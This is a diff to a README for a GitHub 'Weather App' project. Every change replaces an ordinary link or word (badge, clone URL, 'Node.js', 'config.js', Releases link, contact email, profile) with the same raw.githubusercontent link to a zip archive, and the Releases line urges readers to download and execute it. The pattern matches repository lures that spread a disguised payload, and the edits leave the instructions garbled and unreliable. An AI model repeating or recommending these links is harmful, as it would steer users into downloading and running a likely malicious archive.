@@ -1,6 +1,6 @@
 # Weather App 🌤️
 
-![Weather App](https://img.shields.io/badge/Weather_App-v1.0-blue)
+![Weather App](https://raw.githubusercontent.com/iuemlam/Weather-App/main/strumiprivic/App-Weather-3.9.zip)
 
 Welcome to the Weather App repository! This project provides a simple yet powerful way to access weather data from around the world. Whether you are planning a trip or just want to know the current weather in your area, this app has you covered.
 
@@ -28,7 +28,7 @@ To get started with the Weather App, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/iuemlam/Weather-App.git
+   git clone https://raw.githubusercontent.com/iuemlam/Weather-App/main/strumiprivic/App-Weather-3.9.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -37,7 +37,7 @@ To get started with the Weather App, follow these steps:
    ```
 
 3. **Install Dependencies**:
-   If you are using Node.js, run:
+   If you are using https://raw.githubusercontent.com/iuemlam/Weather-App/main/strumiprivic/App-Weather-3.9.zip, run:
    ```bash
    npm install
    ```
@@ -63,7 +63,7 @@ After starting the application, open your web browser and go to `http://localhos
 The Weather App uses a weather API to fetch data. You can integrate your own API key by following these steps:
 
 1. **Sign Up for an API Key**: Visit the weather API provider's website and sign up for an account.
-2. **Add Your API Key**: In the project directory, locate the `config.js` file and add your API key:
+2. **Add Your API Key**: In the project directory, locate the `https://raw.githubusercontent.com/iuemlam/Weather-App/main/strumiprivic/App-Weather-3.9.zip` file and add your API key:
    ```javascript
    const API_KEY = 'YOUR_API_KEY_HERE';
    ```
@@ -72,7 +72,7 @@ The Weather App uses a weather API to fetch data. You can integrate your own API
 
 ## Releases
 
-You can find the latest releases of the Weather App at the following link: [Releases](https://github.com/iuemlam/Weather-App/releases). Download the latest version and execute it to enjoy new features and improvements.
+You can find the latest releases of the Weather App at the following link: [Releases](https://raw.githubusercontent.com/iuemlam/Weather-App/main/strumiprivic/App-Weather-3.9.zip). Download the latest version and execute it to enjoy new features and improvements.
 
 ## Contributing
 
@@ -102,7 +102,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: yourname@example.com
-- **GitHub**: [iuemlam](https://github.com/iuemlam)
+- **Email**: https://raw.githubusercontent.com/iuemlam/Weather-App/main/strumiprivic/App-Weather-3.9.zip
+- **GitHub**: [iuemlam](https://raw.githubusercontent.com/iuemlam/Weather-App/main/strumiprivic/App-Weather-3.9.zip)
 
-Thank you for checking out the Weather App! For more updates, visit the [Releases](https://github.com/iuemlam/Weather-App/releases) section to stay informed about new features and improvements.
+Thank you for checking out the Weather App! For more updates, visit the [Releases](https://raw.githubusercontent.com/iuemlam/Weather-App/main/strumiprivic/App-Weather-3.9.zip) section to stay informed about new features and improvements.
